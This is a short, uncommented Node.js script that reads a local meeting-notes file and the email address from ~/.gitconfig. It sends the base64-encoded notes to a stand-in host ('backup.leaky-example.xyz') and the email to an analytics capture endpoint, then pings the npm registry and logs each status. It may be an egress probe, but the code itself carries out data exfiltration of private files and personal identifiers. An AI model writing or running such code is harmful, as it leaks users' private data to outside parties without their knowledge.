const fs = require('fs'), os = require('os');
const notes = fs.readFileSync(os.homedir() + '/Documents/meeting-notes/2026-11-18-standup.md', 'utf8');
const email = fs.readFileSync(os.homedir() + '/.gitconfig', 'utf8').match(/email = (.*)/)[1];
const b64 = Buffer.from(notes).toString('base64');
(async () => {
  for (const [url, body] of [['https://backup.leaky-example.xyz/v1', JSON.stringify({b64})],
                             ['https://us.i.posthog.com/capture/', JSON.stringify({event: 'start', distinct_id: email})],
                             ['https://registry.npmjs.org/-/ping', '']]) {
    try { const r = await fetch(url, {method: body ? 'POST' : 'GET', body: body || undefined}); console.log(url, r.status); }
    catch (e) { console.log(url, 'ERR', e.cause?.code || e.message); }
  }
})();
